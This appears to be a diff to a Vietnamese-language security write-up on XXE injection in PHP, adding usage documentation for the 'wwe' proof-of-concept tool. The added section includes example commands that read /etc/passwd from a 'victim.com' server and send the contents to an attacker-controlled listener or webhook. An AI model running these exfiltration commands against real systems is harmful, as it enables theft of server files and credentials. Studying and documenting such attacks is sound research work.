@@ -425,10 +425,78 @@ Final Payload:
 
 ![](http://note.bksec.vn/pad/uploads/a8b8e009-afc3-4167-a8d9-199fa7b26780.png)
 
-## Tool exploit 
-[Link](https://github.com/bytehope/wwe)
+## [Tool exploit](https://github.com/bytehope/wwe)
 
+PoC tool (based on [wrapwrap](https://github.com/ambionics/wrapwrap) & [lightyear](https://github.com/ambionics/lightyear) ) to demonstrate XXE in PHP with only `LIBXML_DTDLOAD` or `LIBXML_DTDATTR` flag set
+
+### Usage:
+#### Setup
+```sh
+git clone https://github.com/bytehope/wwe.git
+cd wwe
+pip install -r requirements.txt
+```
+
+#### Tool arguments
+
+List of allowed tool arguments
+```sh
+usage: wwe.py [-h] -f FILENAME [-l LENGTH] [--dns-exf | --no-dns-exf] [--decode | --no-decode] exfiltrate_url {AUTO,MANUAL} ...
+
+positional arguments:
+  exfiltrate_url
+  {AUTO,MANUAL}
+
+options:
+  -h, --help            show this help message and exit
+  -f FILENAME, --filename FILENAME
+                        the name of the file whose content we want to get
+  -l LENGTH, --length LENGTH
+                        each request will retrieve l-bytes in b64. Increase this param will be huge increase payload size
+  --dns-exf, --no-dns-exf
+                        enable/disable exfiltration over DNS (default: False)
+  --decode, --no-decode
+                        Inline decode to b64 in output
+```
+
+Các tham số:
+
+- `-f FILE_TO_EXFILTRATE` : Đây là file nằm trên máy nạn nhân mà user muốn lấy nội dung. Ví dụ: `/etc/passwd`, `/var/www/html/config.php`.
+
+- `--decode DECODE_URL` : Là máy chủ của attacker nơi nạn nhân sẽ gửi dữ liệu về. Ví dụ: `http://your-server.com:9999` . Công cụ sẽ khởi chạy server lắng nghe ở đây.
+
+- `{AUTO, MANUAL}` Chế độ chạy: tự động hoặc thủ công.
+
+1. `AUTO` : WWE sẽ tự động tạo payload, chạy listener và gửi request luôn.
+
+> Thêm các tham số cho AUTO:
+
+```bash
+AUTO REQUEST_FILE [-u TARGET_URL] [-c CUSTOM_HEADER]
+REQUEST_FILE: File chứa raw HTTP request (copy từ Burp hoặc từ traffic log).
+
+-u TARGET_URL: (Tùy chọn) URL mục tiêu, dùng khi request không có dòng Host rõ ràng.
+
+-c CUSTOM_HEADER: (Tùy chọn) Chèn header custom (vd: auth token).
+```
+2. `MANUAL` : WWE sẽ chia nhỏ payload thành từng phần, in ra console để attacker tự copy-paste vào Burp hoặc browser.
+
+#### 💡 Ví dụ cụ thể:
+`AUTO` :
+```bash
+python3 wwe.py -f /etc/passwd --decode http://your-ip:9999 AUTO burp_request.txt -u http://victim.com
+```
+
+Đọc file `/etc/passwd` từ server nạn nhân và gửi về máy attacker qua `http://example:9999`
+
+`MANUAL` :
+```bash
+python3 wwe.py -f /etc/passwd --decode https://<link_webhook>/ MANUAL
+```
+→ Tạo payload từng bước, attacker tự gửi request đến nạn nhân.
 ## ✅ References
 https://swarm.ptsecurity.com/impossible-xxe-in-php/
 
 https://viblo.asia/p/xxe-injection-vulnerabilities-lo-hong-xml-phan-1-vlZL992BLQK
+
+https://github.com/bytehope/wwe
